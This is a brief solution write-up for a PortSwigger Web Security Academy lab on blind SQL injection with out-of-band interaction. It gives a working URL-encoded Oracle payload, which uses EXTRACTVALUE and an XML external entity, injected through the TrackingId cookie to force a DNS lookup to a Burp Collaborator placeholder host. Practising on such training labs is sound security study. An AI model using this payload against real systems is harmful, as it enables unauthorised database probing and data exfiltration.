# Lab-16: [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. 

**Aim :-** To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 



## Solution
- Capture a request in the burp suite

- Start the collaborator in the burp suite to make the DNS lookup

- Add ``` '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual-- ``` to the end of the **TrackingId** cookie

- Change the ``` BURP-COLLABORATOR-SUBDOMAIN ``` to the **collaborator domain**

- Send the request, The server will make a DNS lookup request to the collaborator server